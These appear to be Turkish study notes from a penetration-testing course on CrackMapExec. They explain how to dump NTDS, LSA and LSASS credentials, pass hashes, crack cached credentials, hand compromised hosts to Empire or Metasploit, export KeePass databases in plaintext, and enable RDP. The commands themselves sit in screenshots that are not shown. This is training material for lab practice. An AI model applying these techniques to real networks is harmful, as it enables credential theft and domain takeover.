Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption

Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.

Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.


### Domain Controller'dan NTDS veritabanını boşaltma
![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)

--ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.


### Yalnızca KRBTGT Hesabının Boşaltılması
![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)

Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme
![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)


### Using the Secrets (hashes)

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:


### Using NTLM Hashes
![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.

LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır



### LSA'yı inceleyin

![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
![Pasted image 20241203105942.png](/img/user/resimler/Pasted%20image%2020241203105942.png)

DCC2$ ile başlayan hash formatı Domain Cached Credentials 2 (DCC2), MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse Hashcat kullanılarak kırılabilir çünkü bu algoritma NTLM'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri Pas the Hash saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, $DCC2$ 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes
![Pasted image 20241203110157.png](/img/user/resimler/Pasted%20image%2020241203110157.png)


![Pasted image 20241203110211.png](/img/user/resimler/Pasted%20image%2020241203110211.png)
![Pasted image 20241203110216.png](/img/user/resimler/Pasted%20image%2020241203110216.png)



### LSASS'tan Gettings Secrets
LSASS prosesinin belleği, Windows parolalarını açık metin olarak veya NTLM veya AES256/AES128 gibi diğer hash biçimlerini içerir. Belleği boşaltmak, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

17. [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dökümündeki gerekli baytları uzaktan okumak için Impacket projesini ve kimlik bilgilerini çıkarmak için pypykatz kullanır.


### Lsassy Module

![Pasted image 20241203113833.png](/img/user/resimler/Pasted%20image%2020241203113833.png)

18. Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft Procdump'ı ve kimlik bilgilerini çıkarmak için pypykatz'ı kullanır.


### Procdump Module
![Pasted image 20241203114045.png](/img/user/resimler/Pasted%20image%2020241203114045.png)
![Pasted image 20241203114101.png](/img/user/resimler/Pasted%20image%2020241203114101.png)

19. HandleKatz bu araç, LSASS'a klonlanmış handle'ların kullanımını göstererek aynı şekilde gizlenmiş bir bellek dökümü oluşturur


### Handlekatz Module

![Pasted image 20241203114136.png](/img/user/resimler/Pasted%20image%2020241203114136.png)
![Pasted image 20241203114143.png](/img/user/resimler/Pasted%20image%2020241203114143.png)
![Pasted image 20241203114156.png](/img/user/resimler/Pasted%20image%2020241203114156.png)


20. Nanodump, LSASS prosesinin bir minidump'ını oluşturan esnek bir araçtır. LSASS'a bir handle açılması tespit edilebildiğinden, Nanodump LSASS'a mevcut handle'ları arayabilir. Bir tane bulunursa, onu kopyalayacak ve minidump oluşturmak için kullanacaktır. Böyle bir handle bulmanın garanti olmadığını unutmayın.


### Nanodump Module

![Pasted image 20241203114243.png](/img/user/resimler/Pasted%20image%2020241203114243.png)
![Pasted image 20241203114252.png](/img/user/resimler/Pasted%20image%2020241203114252.png)
![Pasted image 20241203114300.png](/img/user/resimler/Pasted%20image%2020241203114300.png)

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.


### C2 Framework'te Oturumlar Alma
CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla keşif yapmak veya Empire veya Metasploit gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir agent almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan kılavuzu kullanarak Empire framework'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

![Pasted image 20241203120126.png](/img/user/resimler/Pasted%20image%2020241203120126.png)

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz empireadmin kullanıcı adını ve HackTheBoxCME şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma
![Pasted image 20241203120243.png](/img/user/resimler/Pasted%20image%2020241203120243.png)

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak ~/.cme/cme.conf adresinde bulunur. [Empire] seçeneğini empireadmin kullanıcı adı ve HackTheBoxCME şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server 1337 portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

![Pasted image 20241203120720.png](/img/user/resimler/Pasted%20image%2020241203120720.png)
![Pasted image 20241203120727.png](/img/user/resimler/Pasted%20image%2020241203120727.png)

Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya empire/client/config.yaml adresinde bulunur:


### İnceleme

![Pasted image 20241203120800.png](/img/user/resimler/Pasted%20image%2020241203120800.png)
![Pasted image 20241203120806.png](/img/user/resimler/Pasted%20image%2020241203120806.png)

Yapılandırma dosyaları değiştirildikten sonra, Empire istemcisi ile Empire sunucusuna bağlanmalıyız


### Empire Client Connection

![Pasted image 20241203120835.png](/img/user/resimler/Pasted%20image%2020241203120835.png)
![Pasted image 20241203120840.png](/img/user/resimler/Pasted%20image%2020241203120840.png)
![Pasted image 20241203120846.png](/img/user/resimler/Pasted%20image%2020241203120846.png)

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.


### Empire Setting up IP and Port
![Pasted image 20241203120914.png](/img/user/resimler/Pasted%20image%2020241203120914.png)

Artık dinleyicimiz çalışıyor ve empire_exec modülü ile Empire'a bir agent almak için CrackMapExec'i kullanabiliriz. Ayarladığımız dinleyici olan LISTENER=http seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

![Pasted image 20241203121001.png](/img/user/resimler/Pasted%20image%2020241203121001.png)

Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü web_delivery kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te web_delivery modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve web_delivery işleyicisini yapılandıralım


### Metasploit Configure web_delivery Handler

![Pasted image 20241203121139.png](/img/user/resimler/Pasted%20image%2020241203121139.png)
![Pasted image 20241203121202.png](/img/user/resimler/Pasted%20image%2020241203121202.png)

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. URL ve PAYLOAD olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer x64 kullanıyorsak, x64 varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da PAYLOAD=64 kullanabiliriz. Eğer 32 bit payload kullanıyorsak PAYLOAD=32 seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

![Pasted image 20241203121251.png](/img/user/resimler/Pasted%20image%2020241203121251.png)
![Pasted image 20241203121301.png](/img/user/resimler/Pasted%20image%2020241203121301.png)


![Pasted image 20241203121307.png](/img/user/resimler/Pasted%20image%2020241203121307.png)

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks
Başka bir C2 Framework kullanmak istediğimizde, **Komut Yürütme** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **--no-output** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. Eğer böyle bir durum söz konusu değilse, Bloodhound hakkında daha fazla bilgiyi Active Directory Bloodhound modülünde bulabilir veya Bloodhound resmi belgelerine göz atabilirsiniz.


### Bloodhound Mark Sahipli olarak

BloodHound'da bir düğümü (kullanıcı, grup, bilgisayar vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için düğüme sağ tıklayıp **Mark X as Owned** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **Shortest Path from Owned Principals** (Ele Geçirilmiş İlkelerden En Kısa Yol) veya **Shortest Paths to Domain Admins from Owned Principals** (Ele Geçirilmiş İlkelerden Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir kullanıcı veya bilgisayarı BloodHound veritabanında sahipli olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, ~/.cme/cme.conf adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği bh_enabled'ı True olarak ayarlayın.
* bh_uri'yi Bloodhound veritabanı IP adresimize ayarlayın.
* bh_port'u veritabanı portuna ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı neo4j ve şifre HackTheBoxCME! (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

![Pasted image 20241203122852.png](/img/user/resimler/Pasted%20image%2020241203122852.png)

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.


### Bloodhound Verilerinin Toplanması
BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.


### BloodHound verilerinin toplanması

![Pasted image 20241203122958.png](/img/user/resimler/Pasted%20image%2020241203122958.png)
![Pasted image 20241203123005.png](/img/user/resimler/Pasted%20image%2020241203123005.png)

![Pasted image 20241203123037.png](/img/user/resimler/Pasted%20image%2020241203123037.png)


![Pasted image 20241203125002.png](/img/user/resimler/Pasted%20image%2020241203125002.png)
![Pasted image 20241203125011.png](/img/user/resimler/Pasted%20image%2020241203125011.png)

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, robert kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.


### Kullanıcı BloodHound'da Owned Olarak Eklendi

![Pasted image 20241203125602.png](/img/user/resimler/Pasted%20image%2020241203125602.png)

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.


### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme
![Pasted image 20241203125648.png](/img/user/resimler/Pasted%20image%2020241203125648.png)
![Pasted image 20241203125657.png](/img/user/resimler/Pasted%20image%2020241203125657.png)
![Pasted image 20241203125712.png](/img/user/resimler/Pasted%20image%2020241203125712.png)
![Pasted image 20241203125718.png](/img/user/resimler/Pasted%20image%2020241203125718.png)

Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, --ntds veya --lsa seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak procdump veya lsassy gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca kullanıcıları Owned olarak işaretlemektedir. Bir bilgisayarı owned olarak işaretlemek istiyorsak, bh_owned modülünü ve neo4j veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca PASS seçeneğini ekleyeceğiz.

![Pasted image 20241203125824.png](/img/user/resimler/Pasted%20image%2020241203125824.png)

![Pasted image 20241203125832.png](/img/user/resimler/Pasted%20image%2020241203125832.png)


BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

get-network modülü [Active Directory Integrated DNS](https://github.com/dirkjanm/adidnsdump) dökümünü temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, zone transferine benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, dahili ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
Sadece IP adresini almak.
Sadece domain isimlerini al.
Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. ALL=true seçeneğini seçersek, hem IP hem de domain adlarını alır ve ONLY_HOSTS=true olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan Kayıtları Alma
![Pasted image 20241203130413.png](/img/user/resimler/Pasted%20image%2020241203130413.png)

![Pasted image 20241203130427.png](/img/user/resimler/Pasted%20image%2020241203130427.png)
![Pasted image 20241203130436.png](/img/user/resimler/Pasted%20image%2020241203130436.png)

![Pasted image 20241203130443.png](/img/user/resimler/Pasted%20image%2020241203130443.png)

Not: Yazım sırasında, modülün `adidnsdump` aracıyla bazı farklılıkları vardır. Sonuçlar bir hesaptan diğerine farklı olabilir


### LDAP Module - laps
Bir başka harika modül de laps . Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya parola sıfırlama talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için COMPUTER seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir joker karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması
![Pasted image 20241203130705.png](/img/user/resimler/Pasted%20image%2020241203130705.png)

![Pasted image 20241203130838.png](/img/user/resimler/Pasted%20image%2020241203130838.png)
![Pasted image 20241203130844.png](/img/user/resimler/Pasted%20image%2020241203130844.png)

Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır


### LDAP Modülü - MAQ
[MS-DS-Machine-AccountQuot](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)a özniteliği ile temsil edilen Machine Account Quota (MAQ), varsayılan olarak bir kullanıcının bir domain içinde oluşturmasına izin verilen bilgisayar hesaplarının sayısını gösteren domain düzeyinde bir özniteliktir.

Domain'de bir makine oluşturmamızı gerektiren [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) gibi birkaç saldırı vardır ve bu nedenle hesap makinesi kotası özelliğini numaralandırmak çok önemlidir.


### Machine Quota Module
![Pasted image 20241203131107.png](/img/user/resimler/Pasted%20image%2020241203131107.png)


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla nesnenin DACL'lerini okumamızı ve dışa aktarmamızı sağlayan daclread'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:


### daclread Module Options

![Pasted image 20241203131203.png](/img/user/resimler/Pasted%20image%2020241203131203.png)

Diyelim ki grace hesabının tüm ACE'lerini okumak istiyoruz. TARGET seçeneğini ve ACTION read seçeneğini kullanabiliriz:


### Grace Kullanıcısının DACL'sini Oku

![Pasted image 20241203131236.png](/img/user/resimler/Pasted%20image%2020241203131236.png)
![Pasted image 20241203131242.png](/img/user/resimler/Pasted%20image%2020241203131242.png)


Hangi sorumluların DCSync haklarına sahip olduğu gibi belirli hakları da arayabiliriz. TARGET_DN seçeneğini kullanmamız ve ayırt edici alan adını (DN), okunan ACTION'ı ve RIGHTS seçeneği ile aramak istediğimiz hakları belirtmemiz gerekir.


### Searching for Users with DCSync Rights
![Pasted image 20241203131416.png](/img/user/resimler/Pasted%20image%2020241203131416.png)
![Pasted image 20241203131423.png](/img/user/resimler/Pasted%20image%2020241203131423.png)
![Pasted image 20241203131432.png](/img/user/resimler/Pasted%20image%2020241203131432.png)

Çıktıda gösterildiği gibi, ACE[4] robert kullanıcısının hedef domain'de DCSync haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.

### LDAP Protocol Modules

![Pasted image 20241203131512.png](/img/user/resimler/Pasted%20image%2020241203131512.png)



### SMB Protocol Modules
SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için yönetici haklarına ( Pwned! ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver
Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. get_netconnections ve ioxidresolver modüllerini kullanalım ve farklarını görelim.

get_netconnections modülü, ağ bağlantılarını sorgulamak için WMI kullanır. IPv6 ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module
![Pasted image 20241203142100.png](/img/user/resimler/Pasted%20image%2020241203142100.png)


Öte yandan, ioxidresolver modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül IPv6 adreslerini içermez.


### ioxidresolver Module
![Pasted image 20241203142142.png](/img/user/resimler/Pasted%20image%2020241203142142.png)
![Pasted image 20241203142148.png](/img/user/resimler/Pasted%20image%2020241203142148.png)

Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

KeePass, kurumsal ağlarda yöneticiler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir parola yöneticisidir. Bir ana parola onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

![Pasted image 20241203142341.png](/img/user/resimler/Pasted%20image%2020241203142341.png)

Eğer ana parolaya sahip değilsek bir alternatif de Lee Christensen ( @tifkin_) ve Will Schroeder ( @harmj0y) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın tetikleme sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [tetikleyici](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

21. KeePass yapılandırma dosyasını bulun. Biz bunu keepass_discover modülü ile yaptık.
22. ACTION=ADD seçeneğini ve KEEPASS_CONFIG_PATH öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme
![Pasted image 20241203142642.png](/img/user/resimler/Pasted%20image%2020241203142642.png)
Not: KeePass yapılandırma yolu için ters eğik çizgi (/) veya çift eğik çizgi (\) kullandığınızdan emin olun.

Kullanıcının KeePass'i açmasını ve ana parolayı girmesini bekleyin. Bu işlemi zorlamak için ACTION=RESTART seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, USER=julio gibi kullanıcı adı ile USER seçeneğini ekleyebiliriz.

![Pasted image 20241203142812.png](/img/user/resimler/Pasted%20image%2020241203142812.png)

ACTION=POLL seçeneğini kullanarak dışa aktarılan veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Dışa Aktarılan Verilerin Yoklanması
![Pasted image 20241203142916.png](/img/user/resimler/Pasted%20image%2020241203142916.png)

![Pasted image 20241203142924.png](/img/user/resimler/Pasted%20image%2020241203142924.png)

ACTION=CLEAN seçeneğini ve KEEPASS_CONFIG_PATH'i kullanarak yapılandırma dosyasını temizleyin


### Clean Configuration File Changes

![Pasted image 20241203143132.png](/img/user/resimler/Pasted%20image%2020241203143132.png)
![Pasted image 20241203143139.png](/img/user/resimler/Pasted%20image%2020241203143139.png)

Bu modül için her bir seçeneği öğrendik, ancak ACTION=ALL ile hepsini bir kerede alabiliriz. Bu seçeneğin iyi yanı, .xml dosyasında herhangi bir parola girişi arayan ve bunu konsola yazdıran extract_password yöntemini içermesidir.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

![Pasted image 20241203143219.png](/img/user/resimler/Pasted%20image%2020241203143219.png)
![Pasted image 20241203143229.png](/img/user/resimler/Pasted%20image%2020241203143229.png)
Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre /tmp/export.xml dosyasında olacaktır, böylece manuel olarak alabiliriz.


### RDP'yi Etkinleştirme veya Devre Dışı Bırakma
Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü yanal hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. ACTION seçeneğini ve ardından enable veya disable seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme
![Pasted image 20241203143718.png](/img/user/resimler/Pasted%20image%2020241203143718.png)
![Pasted image 20241203143723.png](/img/user/resimler/Pasted%20image%2020241203143723.png)

SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.


### SMB Protocol Modules
![Pasted image 20241203143808.png](/img/user/resimler/Pasted%20image%2020241203143808.png)

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız


### Vulnerability Scan Modules
Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Ortamın Kurulması
Bu senaryoda, bir sunucuyu ele geçirdik ve yönetici kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi 172.16.10.3'tür.

Alana erişim sağlamak için, CME ile Proxy Zincirleri bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme
![Pasted image 20241203144114.png](/img/user/resimler/Pasted%20image%2020241203144114.png)


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma
![Pasted image 20241203144152.png](/img/user/resimler/Pasted%20image%2020241203144152.png)
